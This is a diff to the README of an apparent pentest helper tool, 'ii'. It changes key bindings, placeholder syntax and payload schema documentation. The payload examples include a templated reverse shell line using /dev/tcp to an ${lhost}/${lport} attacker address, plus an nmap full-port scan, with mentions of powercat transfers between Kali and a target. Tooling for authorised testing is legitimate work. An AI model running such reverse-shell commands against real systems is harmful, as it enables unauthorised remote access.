@@ -191,10 +191,12 @@ Keys:
 | Key | Action |
 | --- | --- |
 | `j` / `k` | Move selection |
+| `/` | Enter search mode |
+| `Esc` | Return from search mode to normal mode |
 | `i` | Edit the selected variable |
 | `Enter` | Edit the selected variable, copy the value, and close |
 | `y` | Copy the selected value without closing |
-| `q` / `Esc` / `Ctrl-C` | Abort |
+| `q` / `Ctrl-C` | Abort |
 
 Aborting while editing preserves the original value. A value is replaced only
 after confirming with Return. Edit prompts show Return to save or continue, and
@@ -215,13 +217,10 @@ Renderable placeholders:
 $name
 ${name}
 ${name:t}
-${II_NAME}
-II_NAME
 ```
 
-All renderable names normalize to the same lowercase variable identity. For
-example, `$rhost`, `${rhost}`, `${II_RHOST}`, and bare `II_RHOST` all resolve
-as `rhost` / tmux `ii_rhost`.
+Renderable names normalize to lowercase variable identity. For example,
+`$rhost` and `${rhost}` both resolve as `rhost` / tmux `ii_rhost`.
 
 Resolution order:
 
@@ -264,29 +263,38 @@ payloads/
     basic-alert
 ```
 
-Payload files can use `${II_NAME}` / bare `II_NAME` placeholders or lowercase
-shell-style placeholders:
+Payload files use lowercase shell-style placeholders:
 
 ```text
-/bin/sh -i >/dev/tcp/${II_LHOST}/${II_LPORT} 2>&1 0>&1
+/bin/sh -i >/dev/tcp/${lhost}/${lport} 2>&1 0>&1
 sudo nmap -p- -Pn -T4 $rhost
 ```
 
-Files under `payloads/script/` are for custom scripts. They may use
-`${II_NAME}` placeholders, or lowercase shell-style variables such as `$rhost`,
-`${file}`, and `${file:t}`.
+Files under `payloads/script/` are for custom scripts. They may use lowercase
+shell-style variables such as `$rhost`, `${file}`, and `${file:t}`.
 
 Combo payloads are multi-stage script payloads under `script/combo/`. Use names
 like `script/combo/trans/powercat-K2T-TLKC`, where `K2T` means Kali sends to
 target and `TLKC` means target listens while Kali connects. See
-[payload-schema.md](payload-schema.md) for the combo naming table and `# stage:`
+[payload-schema.md](payload-schema.md) for the combo naming table and stage
 metadata convention.
+
+Combo payloads may use `# stage:` metadata to split operator/target steps. The
+renderer emits those stages as paste-safe comment delimiters such as:
+
+```text
+# --- Target PowerShell: receive file to TEMP ---
+# --- Kali shell: send file and close connection ---
+```
+
+These delimiter lines can be pasted with the commands because `#` is a valid
+comment marker in both PowerShell and common Linux shells.
 
 Payload files use a small plain-text schema:
 
 ```text
 # description: optional operator-facing description
-payload body with ${II_NAME}, $name, ${name}, or ${name:t} placeholders
+payload body with $name, ${name}, or ${name:t} placeholders
 ```
 
 For documentation and tooling, the logical payload object includes `$schema`,
@@ -298,15 +306,16 @@ metadata line is shown in preview but omitted from copied, printed, and written
 output.
 
 The payload selector shows each path, a solid block delimiter, and a one-line
-template preview. It preserves the original tokens and highlights renderable
-tokens in green. The selected payload preview reserves a description block above
-the template body and shows selector controls and copy status in the footer.
+template preview. It highlights renderable tokens in green and normalizes any
+legacy internal `II_` payload tokens to lowercase user-facing names in preview.
+The selected payload preview reserves a description block above the template
+body and shows selector controls and copy status in the footer.
 
-In the selector, `j` and `k` move between payloads. `y` copies the selected
-rendered payload without leaving the selector. `l` unfolds the selected script
-into a full preview and hides the filter input. `j` and `k` still move between
-scripts, Enter renders and outputs, and `q` aborts. `h` returns to the normal
-searchable selector.
+In the selector, `j` and `k` move between payloads. `/` enters search mode and
+Esc returns to normal mode. `y` copies the selected rendered payload without
+leaving the selector. `l` unfolds the selected script into a full preview and
+hides the filter input. `j` and `k` still move between scripts, Enter renders
+and outputs, and `q` aborts. `h` returns to compact normal mode.
 
 Render reports are printed when `ii p` leaves the selector. If you only use `y`
 and then abort, `ii` prints the last copied payload's report. If you use `y`
